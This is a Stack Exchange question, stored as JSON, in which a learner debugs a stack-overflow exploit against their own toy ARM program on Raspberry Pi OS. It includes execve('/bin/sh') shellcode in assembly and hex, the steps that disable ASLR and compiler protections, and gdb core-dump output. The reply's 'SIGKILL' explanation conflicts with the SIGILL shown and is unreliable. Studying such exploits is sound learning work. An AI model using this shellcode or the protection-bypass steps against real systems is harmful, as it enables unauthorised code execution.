{
  "title": "How to resolve illegal instruction for this ARM stack exploitation?",
  "link": "https://reverseengineering.stackexchange.com/questions/29895/how-to-resolve-illegal-instruction-for-this-arm-stack-exploitation",
  "content": "I am trying to write a stack overflow exploit for ARM Cortex-A72 running\nRaspberry Pi OS (32-bit). Because of my choice of OS, I am restricted to\nthe ARMv7 (32-bit) instruction set.\n\nI have been largely following the tutorials on ARM exploit development\nwritten by Azeria\nLabs. However, I am\nstruggling to correctly complete the attack described in the\nreturn-to-libc\ntutorial\n(FWIW, the program.c source is defined\nelsewhere). This\nquestion is intended to be self-contained thus it is not necessary to\nfollow those links. Indeed, while that tutorial was my starting point, I\nhave since made a number of simplifications in the hope of getting the\nexploit to work. Namely,\n\nIn this question, I will focus on my simplified program without the libc\nor argument-passing aspects of the original tutorial. I will pose my\nquestion before presenting the details of my problem. Then I will give a\ndetailed summary of my own attempts to solve the issue, and any\nresources I have consulted along the way.\n\nMy central question: What can I do to make further useful progress\non getting my exploit to work?\n\nFirst of all, I have disabled ASLR by editing\n/proc/sys/kernel/randomize_va_space, replacing 2 with 0.\n\nand by compiling exploit.c with:\n\ngcc exploit.c -o exploit -z execstack -fno-stack-protector -no-pie\n\nso I should be getting consistent stack addresses on subsequent\nexecutions; borne out by my observations.\n\nDebugging stack overflow exploits using gdb is difficult due to the\ndifferences in environment and program variables (affecting stack\naddresses) as described on this\nexchange\nas well as a\ncouple\nothers. Instead\nof directly debugging with gdb, I analyse core files with gdb. I have manually instrumented the exploit to help with debugging.\n\nThe shellcode shelly.s is as follows:\n\n```\n        .section .text\n        .global _start\n        @@ Our shellcode is 32 bytes and ends with the starting stack\n        @@ address of this code.\n_start:\n        .code 32\n        add r3, pc, #1\n        bx r3\n\n        .code 16\n        add r0, pc, #8\n        sub r1,r1\n        sub r2,r2\n        strb r2, [r0, #7]\n        mov r7, #11\n        svc #1\n\n        .ascii \"/bin/shX\"\n        .word 0xbefffd9c\n\n```\nwhich hard-codes the address (0xbefffd9c) corresponding to the start\nof our shellcode. I found this address by debugging the core\ndumps. From shelly.s I generate a string:\n\n```\n$ as shelly.s -o shelly.o\n$ ld -N shelly.o -o shelly\n$ objcopy -O binary shelly shelly.bin\n$ hexdump -v -e '\"\\\\\"\"x\" 1/1 \"%02x\" \"\"' shelly.bin\n\n```\nwith output:\n\n\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\xa0\\x49\\x1a\\x92\\x1a\\xc2\\x71\\x0b\\x27\\x01\\xdf\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x58\\x9c\\xfd\\xff\\xbe\n\nwhich goes into my exploit.c program:\n\n```\n#include <stdio.h>\n#include <string.h>\n\nvoid foo(char *s)\n{\n  char buffer[24];\n  strcpy(buffer, s);\n  __asm__(\"sub r8, fp, #4\"); // for finding the shellcode stack address\n}\n\nint main(void)\n{\n  unsigned char shellcode[] =\n    \"\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\xa0\\x49\\x1a\\x92\\x1a\\xc2\\x71\\x0b\\x27\\x\\\n01\\xdf\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x58\\x9c\\xfd\\xff\\xbe\";\n\n  foo(shellcode);\n  return 0;\n}\n\n```\nAn additional assembly instruction was included to save the state of the\nstack pointer just before popping the frame and return addresses off the\nstack. By debugging core dumps of this program, I was able to compute\nthat 0xbefffd9c is the starting address of my shellcode. I have kept\nthis instruction in the source to assist with debugging core dumps.\n\nI execute the above program using env - ./exploit producing Illegal instruction (core dumped).\n\nNote: I also tried ./exploit directly but this produced Segmentation fault (core dumped) and the respective core files differ in a\nnon-obvious way; both have the same value in R8 and the shellcode\nappears in the expected location. For this question, I want to focus on the\nenv-augmented execution above since that better controls for\nenvironment effects.\n\nInspecting the core with GDB (10.1.90.20210103-git) (with GEF\nextension) we get:\n\n```\nCore was generated by `./program2'.\nProgram terminated with signal SIGILL, Illegal instruction.\n#0  0xbefffdb4 in ?? ()\ngef>  info registers\nr0             0xbefffd78          0xbefffd78\nr1             0xbefffdbd          0xbefffdbd\nr2             0x0                 0x0\nr3             0x0                 0x0\nr4             0x10488             0x10488\nr5             0x0                 0x0\nr6             0x1ebfff7d          0x1ebfff7d\nr7             0x0                 0x0\nr8             0xbefffd90          0xbefffd90\nr9             0x0                 0x0\nr10            0xb6fff000          0xb6fff000\nr11            0x5868732f          0x5868732f\nr12            0xbefffd78          0xbefffd78\nsp             0x0                 0x0\nlr             0x0                 0x0\npc             0xbefffdb4          0xbefffdb4\ncpsr           0xa8000010          0xa8000010\nfpscr          0x0                 0x0\ngef> x/12x $r8\n0xbefffd90: 0x5868732f  0xbefffd9c  0xb6fdd500  0xe28f3001\n0xbefffda0: 0xe12fff13  0x1a49a002  0x71c21a92  0xdf01270b\n0xbefffdb0: 0x6e69622f  0x5868732f  0xbefffd9c  0x00000000\ngef>  x/i 0xbefffd9c\n   0xbefffd9c:  add r3, pc, #1\ngef>  disas foo\nDump of assembler code for function foo:\n   0x00010408 <+0>:     push {r11, lr}\n   0x0001040c <+4>:     add r11, sp, #4\n   0x00010410 <+8>:     sub sp, sp, #32\n   0x00010414 <+12>:    str r0, [r11, #-32] ; 0xffffffe0\n   0x00010418 <+16>:    sub r3, r11, #28\n   0x0001041c <+20>:    ldr r1, [r11, #-32] ; 0xffffffe0\n   0x00010420 <+24>:    mov r0, r3\n   0x00010424 <+28>:    bl  0x102e8 <strcpy@plt>\n   0x00010428 <+32>:    sub r8, r11, #4\n   0x0001042c <+36>:    nop         ; (mov r0, r0)\n   0x00010430 <+40>:    sub sp, r11, #4\n   0x00010434 <+44>:    pop {r11, pc}\n\n```\nand I am not sure how the pc manages to become 0xbefffdb4 since it\nshould be executing my shellcode after foo+44 places 0xbefffd9c into\nthe pc register.\n\nMy understanding of the stack immediately after foo+32:\n\n```\n^higher addresses^\n|       .        | \\\n|       .        |  \\\n|       .        |   |\n|   0x1a49a002   |   |`main` frame\n|   0xe12fff13   |   | \n|   0xe28f3001   |  / <--- start of shellcode\n|   0xb6fdd500   | / <--- junk value (extra space added by compiler)\n+----------------+/\n|   0xbefffd9c   | Return Address\n+----------------+\n|   0x5868732f   | Frame Pointer\n+----------------+\\\n|   0x6e69622f   | \\\n|   0xdf01270b   |  \\\n|   0x71c21a92   |   | foo's frame\n|      ...       |  /\n|   buffer[24]   | /\n|                |/\n+----------------+\n\n```\nA comment by @perror on this\nanswer\nhad me thinking that overwriting the frame pointer with 0x5868732f\ncould be an issue. However, modifying the shellcode to insert\n0xbefffd9c for both frame and return address did not solve the\nproblem. In fact, I gained an additional error as the first instruction\nof my shellcode was decremented by 1; the instruction add r3, pc, #1\nwith hex 0xe28f3001 became 0xe28f3000.\n\nI have been able to execute other people's shellcode. Namely, Jonathan\n'dummys' Borgeaud's 34byte ARM shellcode, located here:\nhttp://shell-storm.org/shellcode/files/shellcode-904.php. However,\nattempts to morph his code into mine proved unsuccessful.\n\n",
  "votes": "3",
  "answers": 1,
  "views": "874",
  "tags": [
    "assembly",
    "debugging",
    "arm",
    "exploit",
    "stack"
  ],
  "user": "RosterPantyhose",
  "time": "Jan 19, 2022 at 6:20",
  "comments": [],
  "answers_data": [
    {
      "content": "The Error which you are getting is because the shell is expecting the input from STDIN, because of which it is terminating with the SIGKILL,\n\nI have tried to explain the details Here . If you add the breakpoint before program exit\n\n0x00010434 <+44>:    pop {r11, pc}\n\nYou will be able to see that shell is spawn.\n\n",
      "votes": "1",
      "user": "Security Beast",
      "time": "Jan 6, 2023 at 4:42",
      "is_accepted": false,
      "comments": []
    }
  ]
}